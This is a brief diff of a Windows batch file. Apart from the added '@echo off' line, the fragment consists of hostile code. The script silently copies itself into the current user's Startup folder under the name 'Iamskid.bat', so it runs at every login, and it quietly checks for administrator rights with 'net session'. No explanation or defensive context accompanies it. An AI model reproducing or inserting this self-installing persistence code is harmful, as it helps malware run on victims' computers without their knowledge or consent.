@@ -1,3 +1,4 @@
+@echo off
 cd /d "%~dp0"
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
 net session >nul 2>&1
